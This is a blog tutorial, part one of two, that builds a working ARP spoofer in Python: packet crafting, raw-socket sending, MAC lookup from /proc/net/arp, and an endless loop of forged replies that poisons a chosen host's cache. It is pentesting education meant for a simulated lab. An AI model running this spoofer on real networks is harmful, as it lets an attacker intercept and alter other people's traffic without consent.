---
layout: post
title: "Write your own ARP Spoofer in Python (part 1/2)"
---

For every popular technique there are already many convenient tools that can execute an attack for you, so why bother writing your own tools? Most probably they won't be even close to being as good as the tools hundreds of pentesters use every day. Nevertheless, I think it's still worth building some yourself for at least one reason: writing forces you to really understand the technique and even if you won't ever use the tool while testing real apps/networks, it's probably one of the best ways to gain knowledge.

Let's start with a quick refresher on ARP and ARP spoofing.

## ARP

[ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) is a link layer protocol of [Internet protocol suite](https://en.wikipedia.org/wiki/Internet_protocol_suite) that enables devices to obtain the link layer address given the internet layer address. In our example it will be: `IPv4 address -> MAC address`.

Let's say we have two hosts in a local area network: `HOST_A` and `HOST_B`. `HOST_A` knows `HOST_B`'s ip address (let's say `y.y.y.y`) and wants to know its MAC address (let's say: `bb:bb:bb:bb:bb:bb`). 

First, `HOST_A` will create an ARP request packet with his MAC, his IP and `HOST_B`'s IP and will address this packet to `ff:ff:ff:ff:ff:ff`, which is the [broadcast address](https://en.wikipedia.org/wiki/Broadcast_address) in Ethernet networks.

Then, `HOST_B` will send an ARP reply message that contains its MAC back to `HOST_A`.

Finally, `HOST_A` will store `HOST_B`'s MAC in its ARP cache.

![arp]({{ "/assets/arp_illustration.png" | relative_url }})

## ARP Spoofing

Due to the fact that ARP is a stateless protocol and there are no means of authorization, `HOST_A` may receive an ARP reply packet from anyone, trust its contents and store it in it's cache even if it didn't send any ARP requests. This allows an attacker to impersonate `HOST_B` and receive all the traffic that `HOST_A` would send to `HOST_B` otherwise.

![lab]({{ "/assets/arp_spoofing_illustration.png" | relative_url }})

The most popular usage of this technique is probably 'telling' the router that you are `HOST_A` and 'telling' `HOST_A` that you are the router, which let's you intercept and modify all the traffic that `HOST_A` receives or sends via internet (unless it's encrypted, then arp spoofing won't be sufficent of course).

## Creating ARP reply packet
### Payload

First, let's create a function that crafts ARP packets for given ip's and mac's. An ARP packet looks like this:

<div class="filename"><a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol#Packet_structure" target="blank">ARP Packet structure | wikipedia</a></div>
{% highlight text %}
          |            0                |                 1
    --------------------------------------------------------------------
      0   |                       Hardware Type
    --------------------------------------------------------------------
      2   |                       Protocol type
    --------------------------------------------------------------------
      4   |  Hardware address length    |     Protocol address length
    --------------------------------------------------------------------
      6   |                         Operation
    --------------------------------------------------------------------
      8   |            Sender hardware address (first 2 bytes)
    --------------------------------------------------------------------
      10  |                      (next 2 bytes)
    --------------------------------------------------------------------
      12  |                      (last 2 bytes)
    --------------------------------------------------------------------
      14  |            Sender protocol address (first 2 bytes)
    --------------------------------------------------------------------
      16  |                      (last 2 bytes)
    --------------------------------------------------------------------
      18  |            Target hardware address (first 2 bytes)
    --------------------------------------------------------------------
      20  |                      (next 2 bytes)
    --------------------------------------------------------------------
      22  |                      (last 2 bytes)
    --------------------------------------------------------------------
      24  |            Target protocol address (first 2 bytes)
    --------------------------------------------------------------------
      26  |                      (last 2 bytes)
    --------------------------------------------------------------------
{% endhighlight %}

Where:

**Hardware type:** is the link layer protocol type. In our case it will be set to `0x0001` for `Ethernet`.

**Protocol type:** is the network layer protocol type. In our case: `0x0800` for `IPv4`.

**Hardware address lenght:** in case of Ethernet it will be `6` bytes.

**Protocol address lenght:** in case of IPv4 is `4` bytes.

**Operation:** is `1` for request and `2` for reply. For ARP spoofing we will need reply packets only, so we'll set this to `0x0002`.

**Sender hardware address**: MAC address of the sender split into three 2-byte chunks. 

**Sender protocol address**: IPv4 address of the sender split into two 2-byte chunks.

**Target hardware address**: MAC address of the target of the reply packet split into three 2-byte chunks. If we had to send a request packet, this field would be ignored.

**Target protocol address**: IPv4 address of the target split into two 2-byte chunks.

<br>
The function we need can look like:

{% highlight python %}
from struct import pack

# ...

ONE_BYTE = '!B'
TWO_BYTES = '!H'

# ...

def create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac):
    hardware_type = 0x0001
    protocol_type = 0x0800
    hardware_address_len = 0x06
    protocol_address_len = 0x04
    operation = 0x0002
    sender_hardware_address = split_mac(sender_mac)
    sender_protocol_address = split_ip(sender_ip)
    target_hardware_address = split_mac(target_mac)
    target_protocol_address = split_ip(target_ip)
    
    return b''.join([
        pack(TWO_BYTES, hardware_type),
        pack(TWO_BYTES, protocol_type),
        pack(ONE_BYTE, hardware_address_len),
        pack(ONE_BYTE, protocol_address_len),
        pack(TWO_BYTES, operation),

        pack(TWO_BYTES, sender_hardware_address[0]),
        pack(TWO_BYTES, sender_hardware_address[1]),
        pack(TWO_BYTES, sender_hardware_address[2]),

        pack(TWO_BYTES, sender_protocol_address[0]),
        pack(TWO_BYTES, sender_protocol_address[1]),

        pack(TWO_BYTES, target_hardware_address[0]),
        pack(TWO_BYTES, target_hardware_address[1]),
        pack(TWO_BYTES, target_hardware_address[2]),

        pack(TWO_BYTES, target_protocol_address[0]),
        pack(TWO_BYTES, target_protocol_address[1])
    ])
{% endhighlight %}

<br>
Here, `!` stands for network (big-endian) byte order, `B` stands for `unsigned char` (one byte) and `H` stands for `unsigned short` (two bytes). For more information read [Byte order](https://docs.python.org/3/library/struct.html#byte-order-size-and-alignment) and [Format Characters](https://docs.python.org/3/library/struct.html#format-characters) section of struct module documentation.

`split_ip` function takes an ip address (string) and splits it to two 2-byte numbers. `split_mac` takes a numeric mac address and splits it to three 2-byte numbers:

{% highlight python %}
def split_ip(ip):
    nums = [int(i) for i in ip.split('.')]
    return (
        (nums[0] << 8) + nums[1],
        (nums[2] << 8) + nums[3],
    )


def split_mac(mac):
    return (
        (mac >> 4 * 8) & 0xffff,
        (mac >> 2 * 8) & 0xffff,
        (mac >> 0 * 8) & 0xffff,
    )
{% endhighlight %}

<br>
### Ethernet header

Besides the payload, we will also need to create the [ethernet header](https://en.wikipedia.org/wiki/Ethernet_frame#Header). This task is much simpler as we need to only specify target's mac, sender's mac and [EtherType](https://en.wikipedia.org/wiki/EtherType) (in our case it will be `0x0806` for ARP):


{% highlight python %}
def create_eth_header(sender_mac, target_mac):
    destination = split_mac(target_mac)
    source = split_mac(sender_mac)
    ether_type = 0x0806 # arp EtherType
    return b''.join([
        pack(TWO_BYTES, destination[0]),
        pack(TWO_BYTES, destination[1]),
        pack(TWO_BYTES, destination[2]),

        pack(TWO_BYTES, source[0]),
        pack(TWO_BYTES, source[1]),
        pack(TWO_BYTES, source[2]),

        pack(TWO_BYTES, ether_type),
    ])
{% endhighlight %}

And finally, we will prepend our ARP payload with an ethernet header:

{% highlight python %}
def create_arp_packet(sender_ip, target_ip, sender_mac, target_mac):
    header = create_eth_header(sender_mac, target_mac)
    payload = create_arp_reply_payload(sender_ip,
                                       target_ip,
                                       sender_mac,
                                       target_mac)
    return b''.join([header, payload]) 
{% endhighlight %}

Ok, we have our packet. It's time to find a way to send it.

## Sending ethernet frames with python's socket module

Luckily, [socket module](https://docs.python.org/3/library/socket.html) enables us to send raw eth packets. All we have to do is to use [AF_PACKET](https://docs.python.org/3/library/socket.html#socket.AF_PACKET) as an address family and [SOCK_RAW](https://docs.python.org/3/library/socket.html#socket.SOCK_RAW) as a socket type. After that, we need to bind it to our ethernet interface and we are ready to send a packet.

{% highlight python %}
def send(packet, interface):
    with socket(AF_PACKET, SOCK_RAW) as s:
        s.bind((interface, 0))
        s.send(packet)
{% endhighlight %}

Now, we can create packets and send them. What's left is to gather some additional information.

## Finding mac address of your and target's machines

We could of course manually check those mac addresses and pass them to our spoofing script but let's automate this for our convenience.

### Your mac

To get our MAC we can use [getnode](https://docs.python.org/3/library/uuid.html#uuid.getnode) function of [uuid](https://docs.python.org/3/library/uuid.html#module-uuid) module.

{% highlight python %}
from uuid import getnode

# ...

    our_mac = getnode()

# ...
{% endhighlight %}

### Target's mac

By now, we could send an ARP request and wait for an response from target's machine but we are going to be a little bit lazy here :). We will simply send anything to the target to make sure that we have an entry for its ip in our ARP cache (on linux boxes it will be stored in `/proc/net/arp`) and then read it from the cache with a little bit of parsing:

{% highlight python %}
def fill_arp_cache_with(ip):
    echo_port = 80
    timeout = 10
    with socket(AF_INET, SOCK_DGRAM) as s:
        s.sendto(b'\x00', (ip, echo_port))


def read_mac_from_arp_cache(ip):
    result = 0
    while result == 0:
        with open('/proc/net/arp') as f:
            arps = f.read()
    
        line = [line for line in arps.split('\n') if ip in line][0]
        mac = line.split()[3]
        result = int(mac.replace(':', ''), 16)

    return result


def find_mac_by_ip(ip):
    fill_arp_cache_with(ip)
    mac = read_mac_from_arp_cache(ip)
    return mac
{% endhighlight %}

## Putting all the pieces together

All that's left to do is to read the interface name, ip of our target and ip of the host we want to impersonate from command line arguments and use it to create and send ARP replies:

{% highlight python %}
# ...

import sys

# ...

def main(interface, impersonated_host_ip, poisoned_host_ip):
    poisoned_host_mac = find_mac_by_ip(poisoned_host_ip)
    our_mac = getnode()

    packet = create_arp_packet(sender_ip=impersonated_host_ip,
                               target_ip=poisoned_host_ip,
                               sender_mac=our_mac,
                               target_mac=poisoned_host_mac)
    
    while True:
        send(packet, interface)


def print_help():
    doc = '''
        Usage:
          {} INTERFACE IMPERSONATED_HOST_IP POISONED_HOST_IP
    '''.format(__file__)
    print(inspect.cleandoc(doc))


if __name__ == '__main__':
    try:
        (script_name, interface, impersonated_host_ip, poisoned_host_ip) = sys.argv
    except ValueError:
        print_help() 
        sys.exit(1)

    try:
        main(interface, impersonated_host_ip, poisoned_host_ip)
    except KeyboardInterrupt:
        print('\nDone.')
        sys.exit(0)
{% endhighlight %}

Full script can be found [here](https://github.com/searabbitx/arp-spoofer/blob/master/arp_spoofer.py).

## What's next?

Ok, that's it for the first part. Next time we are going to build the lab in [GNS3](https://gns3.com/) network simulator and test our script.

Happy spoofing!
